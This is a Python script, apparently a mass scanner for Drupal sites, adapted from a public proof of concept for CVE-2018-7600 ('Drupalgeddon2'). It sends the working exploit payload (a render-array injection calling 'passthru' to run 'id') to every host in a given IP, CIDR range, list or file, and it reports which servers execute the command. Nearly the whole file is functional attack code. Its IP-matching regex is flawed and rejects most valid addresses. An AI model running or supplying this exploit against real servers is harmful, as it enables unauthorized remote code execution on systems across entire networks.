#written by fyraiga 
#POC adapted from FireFart CVE-2018-7600

#import here
import requests
import re
import sys
import ipaddress
import argparse
import itertools
import re

#functions
def exploit(url_target):
    send_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
    send_data = {'form_id':'user_pass', '_triggering_element_name':'name'}
    ipregex = re.compile("(\d{3}\.){3}\d{3}")
    result = ipregex.fullmatch(url_target)
    if result is not None:
        try:
            url_target = "http://"+url_target
            r = requests.post(url_target, data=send_data, params=send_params, timeout=5)
        except requests.exceptions.Timeout:
            print("ERROR: Server seems to be down (Timeout)")
            return
        except requests.exceptions.ConnectionError:
            print("ERROR: Server seems to be up. However, we are not able to connect to the webserver.")
            return
        except requests.exceptions.HTTPError:
            print("ERROR: 4xx/5xx")
            return
        except requests.exceptions.InvalidURL:
            print("ERROR: Invalid URL.")
        except Exception:
            print("ERROR: Unexpected Error")
            sys.exit()
        else: 
            print("OK: Alive")
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            print("\tOK: Server seems to be running Drupal")
            found = m.group(1)
            send_params = {'q':'file/ajax/name/#value/' + found}
            send_data = {'form_build_id':found}
            r = requests.post(url_target, data=send_data, params=send_params)
            r.encoding = 'ISO-8859-1'
            out = r.text.split("[{")[0].strip()
            if out == "":
                print("\tNothing to see here (Server is not vulnerable)")
            else: 
                print("\tVULNERABLE SERVER! ***************************************** ")
        else:
            print("\tABORT: Not Drupal?", end=' **\n')
    else:
        raise ValueError("Invalid IP Address")

def process_file(target):
    try:
        file = open(target, "r")
        for line in file:
            print("[~] {}".format(line.strip()), end=' ** ', flush=True)
            exploit(str(ipaddress.ip_address(line.strip())))
    except FileNotFoundError:
        print("[!] Unable to locate file. Check file path.")
        sys.exit()
    except ValueError:
        print("[!] Invalid value in file. Ensure only IPv4 addresses exist!")
        sys.exit()
    except Exception as e:
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        sys.exit()

def process_multiple(target):
    hostlist = target.split(",")
    try:
        for host in hostlist:
            print("[~] {}".format(host.strip()), end=' ** ', flush=True)
            exploit(str(host.strip()))
    except ValueError:
        print("[!] Invalid Input. Only IPv4 addresses are accepted.")
        sys.exit()

def process_range(target):
    try:
        rangelist = []
        raw_octets = target.split(".")
        octets = [x.strip().split("-") for x in raw_octets]
        octet_range = [range(int(x[0]), int(x[1])+1) if len(x) == 2 else x for x in octets]
        for x in itertools.product(*octet_range):
            rangelist.append('.'.join(map(str,x)))
        for addr in rangelist:
            print("[~] {}".format(addr), end=' ** ', flush=True)
            exploit(str(addr))
    except ValueError:
        print("[!] Invalid Input. Only IPv4 ranges are accepted.")
        sys.exit()
    except Exception:
        print("Unexpected Errror")
        sys.exit()

def process_ip_cidr(target):
    hostlist = []
    try:
        net = ipaddress.ip_network(target.strip(), strict=False)
        for host in net.hosts():
            hostlist.append(host)
            print("[~] {}".format(host), end=' ** ', flush=True)
            exploit(str(host))
        if len(hostlist) == 0:
            print("[~] {}".format(target), end=' ** ', flush=True)
            exploit(str(ipaddress.ip_address(target.strip())))
    except ValueError:
        print("[!] Invalid Input\n\tOnly IPv4 & valid CIDR addresses are accepted for IP mode.\n\tUse -h to see other modes.")
        sys.exit()
    except Exception:
        print("Unexpected Error")
        sys.exit()

#main here
def main():
    parser = argparse.ArgumentParser(prog="drupalgeddon2-scan.py",
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50))
    try:
        parser.add_argument("target", help="IP of target site(s)")
        parser.add_argument('-f', "--file", default=False, action="store_true", help="Retrieve IP Addresses from a file (1 per line)")
        parser.add_argument('-i', "--ip", default=True, action="store_true", help="Single IP Address (supports CIDR range)")
        parser.add_argument('-m', "--multiple", default=False, action="store_true", help="Multiple IP Adddress e.g. 192.168.0.1,192.168.0.2,192.168.0.3")
        parser.add_argument('-r', "--range", default=False, action="store_true", help="IP Range e.g. 192.168.1-2.0-254 (nmap format)")
        parser.add_argument("-o", "--http-only", default=False, action="store_true", help="To be implemented (Current state, https not implemented)")
        parser.add_argument("-s", "--https-only", default=False, action="store_true", help="To be implemented")
    except Exception:
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        sys.exit()
    try:
        args, u = parser.parse_known_args()
    except Exception:
        print("[!] Invalid arguments!")
        sys.exit()

    #Verbose message
    print("[~] Starting scan...")

    #IPs from a file
    if args.file == True:
        process_file(args.target)

    #Multiple IPs (separated w commas)
    elif args.multiple == True:
        process_multiple(args.target)

    #IP Range (start-end)
    elif args.range == True:
        process_range(args.target)

    #IP Address/CIDR
    elif args.ip == True:
        process_ip_cidr(args.target)
        
    #Unrecognised arguments
    else:
        print("[!] Unexpected Outcome! This should not be happening. Please inform me at Github!")
        sys.exit()
    sys.exit()

#ifmain here
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print (" -- Ctrl+C caught. Terminating program.")
    except Exception:
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        

